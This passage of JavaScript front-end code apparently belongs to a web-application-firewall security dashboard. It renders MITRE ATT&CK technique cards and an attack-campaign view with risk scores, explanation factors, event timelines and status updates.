      const hits = mitreStats[tech.id] || (tech.id.startsWith("T1059") ? mitreStats["T1059"] : 0) || 0;
      const isActive = hits > 0;
      if (isActive) activeCount++;

      return `
        <div class="mitre-tech-card ${isActive ? 'active-threat' : ''}" title="${escapeHtml(tech.desc)}">
          <div class="mitre-tech-id">${escapeHtml(tech.id)}</div>
          <div class="mitre-tech-name">${escapeHtml(tech.name)}</div>
          <div class="mitre-tech-hits">
            <i data-lucide="${isActive ? 'alert-triangle' : 'check-circle'}" style="width:11px;height:11px;"></i>
            <span>${isActive ? `${hits} Active Incident${hits > 1 ? 's' : ''}` : 'Baseline Protected'}</span>
          </div>
        </div>
      `;
    }).join("");

    return `
      <div class="mitre-tactic-col">
        <div class="mitre-tactic-header">
          <span>${escapeHtml(tactic.name)}</span>
          <span style="font-size:10px;color:var(--text-tertiary);">${tactic.techniques.length}</span>
        </div>
        ${techCards}
      </div>
    `;
  }).join("");

  if (badge) {
    badge.textContent = `${activeCount} Active Technique${activeCount !== 1 ? 's' : ''}`;
    badge.className = activeCount > 0 ? "badge badge-critical" : "badge badge-low";
  }

  if (window.lucide) lucide.createIcons({ root: container });
}

// ═══════════════════════════════════════════════════════════════════
// PHASE 2 — ATTACK CAMPAIGNS CONTROLLER & EXPLAINABILITY ENGINE
// ═══════════════════════════════════════════════════════════════════

let activeCampaignModalId = null;

function initCampaignControls() {
  // Refresh button
  document.getElementById("campaign-refresh-btn")?.addEventListener("click", async () => {
    await refreshCampaignStats();
    await refreshCampaigns();
    showToast("Campaigns refreshed.", "info");
  });

  // Filter dropdowns
  document.getElementById("campaign-filter-status")?.addEventListener("change", () => {
    refreshCampaigns();
  });

  document.getElementById("campaign-filter-risk")?.addEventListener("change", () => {
    refreshCampaigns();
  });

  // Re-correlate Historical Events backfill button
  document.getElementById("campaign-backfill-btn")?.addEventListener("click", async () => {
    const btn = document.getElementById("campaign-backfill-btn");
    const origHtml = btn.innerHTML;
    btn.disabled = true;
    btn.innerHTML = '<i data-lucide="loader" style="width:13px;height:13px;"></i> Correlating...';
    if (window.lucide) lucide.createIcons({ root: btn });

    try {
      const res = await fetch("/api/campaigns/backfill", { method: "POST" });
      const data = await res.json();
      if (res.ok) {
        showToast(data.message || "Historical backfill complete.", "success");
        await refreshCampaignStats();
        await refreshCampaigns();
      } else {
        showToast(`Backfill error: ${data.error}`, "error");
      }
    } catch (err) {
      showToast(`Backfill request failed: ${err.message}`, "error");
    } finally {
      btn.disabled = false;
      btn.innerHTML = origHtml;
      if (window.lucide) lucide.createIcons({ root: btn });
    }
  });

  // Modal Mitigate Button
  document.getElementById("modal-campaign-mitigate-btn")?.addEventListener("click", async () => {
    if (!activeCampaignModalId) return;
    await updateCampaignStatus(activeCampaignModalId, "MITIGATED");
  });
}

async function refreshCampaignStats() {
  try {
    const res = await fetch("/api/campaigns/stats");
    if (!res.ok) return;
    const stats = await res.json();

    // Top Metric Cards
    const totalEl = document.getElementById("stat-campaigns-total");
    if (totalEl) totalEl.textContent = stats.totalCampaigns || 0;

    const activeSubEl = document.getElementById("stat-campaigns-active-sub");
    if (activeSubEl) activeSubEl.textContent = `Active campaigns: ${stats.activeCampaigns || 0}`;

    const highEl = document.getElementById("stat-campaigns-high");
    if (highEl) highEl.textContent = stats.highRiskCampaigns || 0;

    const redEl = document.getElementById("stat-campaigns-reduction");
    if (redEl) redEl.textContent = `${stats.consolidationRatio || 1} : 1`;

    const eventsSubEl = document.getElementById("stat-campaigns-events-sub");
    if (eventsSubEl) eventsSubEl.textContent = `Eligible: ${stats.eligibleWafEvents || stats.uniqueCorrelatedEvents || 0} (${stats.excludedWafEvents || 0} excluded)`;

    const avgRiskEl = document.getElementById("stat-campaigns-avg-risk");
    if (avgRiskEl) avgRiskEl.textContent = `${stats.avgRiskScore || 0}/100`;

    // Sidebar Pill
    const pill = document.getElementById("active-campaigns-pill");
    if (pill) {
      pill.textContent = stats.activeCampaigns || 0;
      pill.style.display = stats.activeCampaigns > 0 ? "inline-block" : "none";
    }

    // Comparative Evaluation Card (B10)
    const evalRaw = document.getElementById("eval-raw-count");
    if (evalRaw) evalRaw.textContent = `${stats.totalWafEvents || stats.totalRawEvents || 0} total records`;

    const evalEligible = document.getElementById("eval-eligible-count");
    if (evalEligible) evalEligible.textContent = stats.eligibleWafEvents || stats.uniqueCorrelatedEvents || 0;

    const evalExcluded = document.getElementById("eval-excluded-count");
    if (evalExcluded) evalExcluded.textContent = stats.excludedWafEvents || 0;

    const evalCamp = document.getElementById("eval-campaign-count");
    if (evalCamp) evalCamp.textContent = `${stats.totalCampaigns || 0} campaigns`;

    const evalRedBadge = document.getElementById("eval-reduction-badge");
    if (evalRedBadge) evalRedBadge.textContent = `${stats.consolidationRatio || 1}:1 ratio (${stats.consolidationPercent || 0}% consolidation)`;

  } catch (err) {
    console.warn("[CAMPAIGNS-UI] Failed to refresh campaign stats:", err.message);
  }
}

async function refreshCampaigns() {
  const tableBody = document.getElementById("campaigns-table-body");
  if (!tableBody) return;

  const statusFilter = document.getElementById("campaign-filter-status")?.value || "";
  const riskFilter = document.getElementById("campaign-filter-risk")?.value || "";

  const queryParams = new URLSearchParams();
  if (statusFilter) queryParams.append("status", statusFilter);
  if (riskFilter) queryParams.append("riskLevel", riskFilter);
  queryParams.append("limit", "100");

  try {
    const res = await fetch(`/api/campaigns?${queryParams.toString()}`);
    if (!res.ok) throw new Error("Failed to load campaigns");
    const data = await res.json();
    const campaigns = data.campaigns || [];

    const countBadge = document.getElementById("campaigns-count-badge");
    if (countBadge) countBadge.textContent = `${campaigns.length} Campaign${campaigns.length !== 1 ? 's' : ''}`;

    renderCampaignsTable(campaigns);
  } catch (err) {
    tableBody.innerHTML = `<tr><td colspan="7" style="text-align:center;padding:24px;color:var(--sev-crit);">Error loading campaigns: ${escapeHtml(err.message)}</td></tr>`;
  }
}

function renderCampaignsTable(campaigns) {
  const tbody = document.getElementById("campaigns-table-body");
  if (!tbody) return;

  if (!campaigns || campaigns.length === 0) {
    tbody.innerHTML = `<tr><td colspan="7" style="text-align:center;padding:36px;color:var(--text-muted);">No correlated attack campaigns match the selected filters.</td></tr>`;
    return;
  }

  tbody.innerHTML = campaigns.map(c => {
    // Identity Badge
    const isSim = c.identityType === "SIMULATION_SESSION";
    const rawIp = c.correlationKey.replace(/^(SIM|REAL):/, "");
    const identityBadge = isSim
      ? `<span class="badge-simulation"><i data-lucide="cpu" style="width:11px;height:11px;"></i> SIM: ${escapeHtml(rawIp)}</span>`
      : `<span class="badge-real-ip"><i data-lucide="globe" style="width:11px;height:11px;"></i> REAL: ${escapeHtml(rawIp)}</span>`;

    // Contextual Risk Badge
    let riskBadgeClass = "badge-risk-low";
    if (c.riskLevel === "CRITICAL") riskBadgeClass = "badge-risk-crit";
    else if (c.riskLevel === "HIGH") riskBadgeClass = "badge-risk-high";
    else if (c.riskLevel === "MODERATE") riskBadgeClass = "badge-risk-mod";

    // Categories
    const cats = (c.attackCategories || []).slice(0, 2).map(cat => 
      `<span style="background:rgba(255,255,255,0.04);border:1px solid var(--border-1);border-radius:var(--r-xs);padding:2px 6px;font-size:10.5px;margin-right:4px;">${escapeHtml(cat)}</span>`
    ).join("");
    const moreCats = (c.attackCategories || []).length > 2 
      ? `<span style="font-size:10px;color:var(--text-muted);">+${(c.attackCategories.length - 2)} more</span>` 
      : "";

    // Status Badge
    let statusColor = "var(--status-open)";
    if (c.status === "MITIGATED") statusColor = "var(--status-resolved)";
    else if (c.status === "CLOSED") statusColor = "var(--text-muted)";

    // Time
    const firstStr = new Date(c.firstSeen).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
    const lastStr = new Date(c.lastSeen).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });

    return `
      <tr style="border-bottom:1px solid var(--border-1);transition:background 0.15s ease;" onmouseover="this.style.background='rgba(255,255,255,0.02)'" onmouseout="this.style.background='transparent'">
        <td style="padding:12px 14px;">
          <div style="font-weight:700;font-family:var(--font-mono);font-size:12px;margin-bottom:3px;color:var(--text-primary);">${escapeHtml(c.id)}</div>
          <div>${identityBadge}</div>
        </td>
        <td style="padding:12px 14px;">
          <div style="display:flex;align-items:center;gap:8px;">
            <span class="badge ${riskBadgeClass}" style="font-family:var(--font-mono);font-size:11px;">
              ${c.riskScore}/100 — ${c.riskLevel}
            </span>
          </div>
        </td>
        <td style="padding:12px 14px;">
          <div style="display:flex;align-items:center;flex-wrap:wrap;gap:4px;">
            ${cats || '<span style="color:var(--text-muted);font-size:11px;">General Anomaly</span>'} ${moreCats}
          </div>
        </td>
        <td style="padding:12px 14px;font-family:var(--font-mono);font-size:11.5px;">
          <span style="color:var(--text-primary);font-weight:600;">${c.eventCount}</span> events
          <span style="color:${c.blockedCount > 0 ? 'var(--sev-crit)' : 'var(--text-muted)'};font-size:10.5px;display:block;">
            (${c.blockedCount} blocked)
          </span>
        </td>
        <td style="padding:12px 14px;font-size:11px;color:var(--text-secondary);">
          <div>${firstStr}</div>
          <div style="color:var(--text-muted);font-size:10px;">to ${lastStr}</div>
        </td>
        <td style="padding:12px 14px;">
          <span class="badge" style="background:rgba(255,255,255,0.03);border:1px solid var(--border-1);color:${statusColor};font-size:10px;font-weight:700;">
            ${escapeHtml(c.status)}
          </span>
        </td>
        <td style="padding:12px 14px;text-align:right;">
          <button class="btn btn-secondary btn-sm inspect-camp-btn" data-camp-id="${escapeHtml(c.id)}" style="font-size:11px;padding:4px 8px;">
            <i data-lucide="eye" style="width:12px;height:12px;"></i> Inspect
          </button>
        </td>
      </tr>
    `;
  }).join("");

  // Attach inspection handlers
  tbody.querySelectorAll(".inspect-camp-btn").forEach(btn => {
    btn.addEventListener("click", () => {
      const campId = btn.getAttribute("data-camp-id");
      if (campId) openCampaignModal(campId);
    });
  });

  if (window.lucide) lucide.createIcons({ root: tbody });
}

async function openCampaignModal(campaignId) {
  const modal = document.getElementById("campaign-modal");
  if (!modal) return;
  activeCampaignModalId = campaignId;

  try {
    // Parallel fetch of campaign details, explanation, and events
    const [campRes, explRes, evtsRes] = await Promise.all([
      fetch(`/api/campaigns/${campaignId}`),
      fetch(`/api/campaigns/${campaignId}/explanation`),
      fetch(`/api/campaigns/${campaignId}/events`)
    ]);

    if (!campRes.ok) throw new Error("Could not load campaign record");
    const campaign = await campRes.json();
    const explanation = explRes.ok ? await explRes.json() : null;
    const eventsData = evtsRes.ok ? await evtsRes.json() : { timeline: [] };
    const timeline = eventsData.timeline || [];

    // Header Info
    const idEl = document.getElementById("modal-campaign-id");
    if (idEl) idEl.textContent = campaign.id;

    const titleEl = document.getElementById("modal-campaign-title");
    if (titleEl) titleEl.textContent = `Campaign: ${campaign.correlationKey}`;

    const subEl = document.getElementById("modal-campaign-sub");
    if (subEl) {
      const firstStr = new Date(campaign.firstSeen).toLocaleString();
      const lastStr = new Date(campaign.lastSeen).toLocaleTimeString();
      subEl.textContent = `${campaign.identityType} | First Observed: ${firstStr} — Last Seen: ${lastStr}`;
    }

    // Score Circle
    const scoreNum = document.getElementById("modal-risk-score-num");
    if (scoreNum) scoreNum.textContent = campaign.riskScore;

    const circle = document.getElementById("modal-risk-score-circle");
    const levelBadge = document.getElementById("modal-risk-level-badge");
    let riskColor = "#34d399";
    let badgeClass = "badge-risk-low";

    if (campaign.riskLevel === "CRITICAL") {
      riskColor = "#ef4444";
      badgeClass = "badge-risk-crit";
    } else if (campaign.riskLevel === "HIGH") {
      riskColor = "#fb923c";
      badgeClass = "badge-risk-high";
    } else if (campaign.riskLevel === "MODERATE") {
      riskColor = "#fbbf24";
      badgeClass = "badge-risk-mod";
    }

    if (circle) {
      circle.style.borderColor = riskColor;
      circle.style.background = `radial-gradient(circle, ${riskColor}15 0%, rgba(0,0,0,0) 70%)`;
    }
    if (levelBadge) {
      levelBadge.textContent = campaign.riskLevel;
      levelBadge.className = `badge ${badgeClass}`;
    }

    // 5 Factors Breakdown Rendering
    const factorsContainer = document.getElementById("modal-factors-container");
    if (factorsContainer && explanation && explanation.explanationJson && explanation.explanationJson.factors) {
      const f = explanation.explanationJson.factors;
      const factorConfigs = [
        { key: "severity", name: "Severity (S)", weight: "35%", color: "#ef4444", val: f.severity },
        { key: "frequency", name: "Frequency (F)", weight: "25%", color: "#fb923c", val: f.frequency },
        { key: "diversity", name: "Vector Diversity (D)", weight: "20%", color: "#a855f7", val: f.diversity },
        { key: "persistence", name: "Persistence (P)", weight: "10%", color: "#38bdf8", val: f.persistence },
        { key: "targetSensitivity", name: "Target Sensitivity (T)", weight: "10%", color: "#ec4899", val: f.targetSensitivity }
      ];

      factorsContainer.innerHTML = factorConfigs.map(cfg => {
        const score = cfg.val ? cfg.val.score : 0;
        const contrib = cfg.val ? cfg.val.contribution : 0;
        const desc = cfg.val ? cfg.val.description : "";

        return `
          <div class="factor-item">
            <div class="factor-label-row">
              <span style="font-weight:600;color:var(--text-primary);display:flex;align-items:center;gap:6px;">
                <span style="width:8px;height:8px;border-radius:50%;background:${cfg.color};"></span>
                ${cfg.name} <span style="font-size:10px;color:var(--text-muted);">(${cfg.weight} weight)</span>
              </span>
              <span style="font-family:var(--font-mono);font-size:11px;">
                <strong>${score}/100</strong> <span style="color:var(--text-secondary);font-size:10px;">(+${contrib} pts)</span>
              </span>
            </div>
            <div class="factor-bar-track">
              <div class="factor-bar-fill" style="width:${Math.min(100, score)}%;background:${cfg.color};"></div>
            </div>
            <div style="font-size:10.5px;color:var(--text-secondary);">${escapeHtml(desc)}</div>
          </div>
        `;
      }).join("");
    }

    // Evidence & Narrative Summary
    const summaryEl = document.getElementById("modal-explanation-summary");
    if (summaryEl && explanation && explanation.explanationJson) {
      summaryEl.textContent = explanation.explanationJson.summary || "No narrative explanation available.";
    }

    const evidenceEl = document.getElementById("modal-explanation-evidence");
    if (evidenceEl && explanation && explanation.explanationJson && explanation.explanationJson.evidence) {
      const ev = explanation.explanationJson.evidence;
      evidenceEl.innerHTML = `
        <span class="badge" style="background:rgba(255,255,255,0.04);border:1px solid var(--border-1);color:var(--text-secondary);">
          <i data-lucide="activity" style="width:11px;height:11px;"></i> ${ev.totalEvents} Total Events (${ev.blockedEvents} Blocked / ${ev.allowedEvents} Passed)
        </span>
        <span class="badge" style="background:rgba(255,255,255,0.04);border:1px solid var(--border-1);color:var(--text-secondary);">
          <i data-lucide="clock" style="width:11px;height:11px;"></i> Probing Window: ${ev.timeSpanSeconds}s
        </span>
        <span class="badge" style="background:rgba(255,255,255,0.04);border:1px solid var(--border-1);color:var(--text-secondary);">
          <i data-lucide="shield-alert" style="width:11px;height:11px;"></i> Peak CRS Anomaly Score: ${ev.maxAnomalyScore || 0}
        </span>
        ${(ev.categories || []).map(cat => `<span class="badge" style="background:rgba(139,92,246,0.1);border:1px solid rgba(139,92,246,0.3);color:var(--violet-300);">${escapeHtml(cat)}</span>`).join("")}
      `;
    }

    // Chronological Progression Timeline
    const timelineEl = document.getElementById("modal-progression-timeline");
    if (timelineEl) {
      if (timeline.length === 0) {
        timelineEl.innerHTML = `<div style="font-size:12px;color:var(--text-muted);padding:10px;">No timeline steps recorded.</div>`;
      } else {
        timelineEl.innerHTML = timeline.map((step, idx) => {
          const stepNum = idx + 1;
          const time = new Date(step.timestamp).toLocaleTimeString();
          const isBlocked = step.blocked;
          const badgeClass = isBlocked ? "badge-risk-crit" : "badge-low";
          const actionText = isBlocked ? "BLOCKED 403" : "ALLOWED 200";

          return `
            <div class="progression-step-item">
              <div class="progression-step-badge">${stepNum}</div>
              <div style="flex:1;min-width:0;">
                <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:3px;flex-wrap:wrap;gap:6px;">
                  <span style="font-weight:700;font-family:var(--font-mono);font-size:12px;color:var(--text-primary);">
                    ${escapeHtml(step.method)} ${escapeHtml(step.uri)}
                  </span>
                  <div style="display:flex;align-items:center;gap:6px;">
                    <span class="badge ${badgeClass}" style="font-size:10px;padding:2px 6px;">${actionText}</span>
                    <span class="badge" style="background:rgba(139,92,246,0.15);border:1px solid rgba(139,92,246,0.35);color:var(--violet-300);font-size:10px;font-family:var(--font-mono);">
                      Cumulative Risk: ${step.riskScoreAfterEvent}/100
                    </span>
                  </div>
                </div>
                <div style="font-size:11px;color:var(--text-secondary);display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
                  <span><i data-lucide="clock" style="width:10px;height:10px;"></i> ${time}</span>
                  <span>Primary Signature: <strong>${escapeHtml(step.primaryRuleId || 'OWASP-CRS')}</strong></span>
                  ${step.anomalyScore ? `<span>Inbound Anomaly: <strong>${step.anomalyScore}</strong></span>` : ''}
                </div>
              </div>
            </div>
          `;
        }).join("");
      }
    }

    // Correlated Events Data Table
    const eventsCountEl = document.getElementById("modal-events-count");
    if (eventsCountEl) eventsCountEl.textContent = timeline.length;

    const eventsTableBody = document.getElementById("modal-events-table-body");
    if (eventsTableBody) {
      eventsTableBody.innerHTML = timeline.map(e => {
        const time = new Date(e.timestamp).toLocaleTimeString();
        const isBlocked = e.blocked;
        return `
          <tr style="border-bottom:1px solid var(--border-1);">
            <td style="padding:6px 10px;font-family:var(--font-mono);color:var(--text-muted);font-size:11px;">${time}</td>
            <td style="padding:6px 10px;font-family:var(--font-mono);">${escapeHtml(e.method)} ${escapeHtml(e.uri)}</td>
            <td style="padding:6px 10px;color:var(--text-secondary);">${escapeHtml(e.primaryRuleId || '—')} — ${escapeHtml(e.primaryRuleMsg || e.action)}</td>
            <td style="padding:6px 10px;font-family:var(--font-mono);color:${(e.anomalyScore || 0) >= 5 ? 'var(--sev-high)' : 'var(--text-muted)'};">${e.anomalyScore || 0}</td>
            <td style="padding:6px 10px;">
              <span class="badge ${isBlocked ? 'badge-risk-crit' : 'badge-low'}" style="font-size:9.5px;padding:2px 5px;">
                ${isBlocked ? 'BLOCKED' : 'ALLOWED'}
              </span>
            </td>
          </tr>
        `;
      }).join("");
    }

    // Linked Incident Slot
    const incidentSlot = document.getElementById("modal-linked-incident-slot");
    if (incidentSlot) {
      if (campaign.incidentId) {
        incidentSlot.innerHTML = `
          <button id="jump-incident-btn" class="btn btn-primary btn-sm" style="font-size:11px;padding:3px 8px;">
            <i data-lucide="external-link" style="width:11px;height:11px;"></i> Open Linked Incident ${escapeHtml(campaign.incidentId)}
          </button>
        `;
        document.getElementById("jump-incident-btn")?.addEventListener("click", () => {
          modal.style.display = "none";
          switchView("view-incidents");
          openIncidentInspector(campaign.incidentId);
        });
      } else {
        incidentSlot.innerHTML = `<span style="font-size:10.5px;color:var(--text-muted);">No linked incident</span>`;
      }
    }

    modal.style.display = "flex";
    if (window.lucide) lucide.createIcons({ root: modal });

  } catch (err) {
    showToast(`Error opening campaign inspector: ${err.message}`, "error");
  }
}

async function updateCampaignStatus(campaignId, newStatus) {
  try {
    const res = await fetch(`/api/campaigns/${campaignId}/status`, {
      method: "PATCH",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ status: newStatus })
    });

    if (res.ok) {
      showToast(`Campaign ${campaignId} status marked as ${newStatus}.`, "success");
      await refreshCampaignStats();
      await refreshCampaigns();
      const modal = document.getElementById("campaign-modal");
      if (modal) modal.style.display = "none";
    } else {
      const data = await res.json();
      showToast(`Failed to update campaign status: ${data.error}`, "error");
    }
  } catch (err) {
    showToast(`Status update error: ${err.message}`, "error");
  }
}


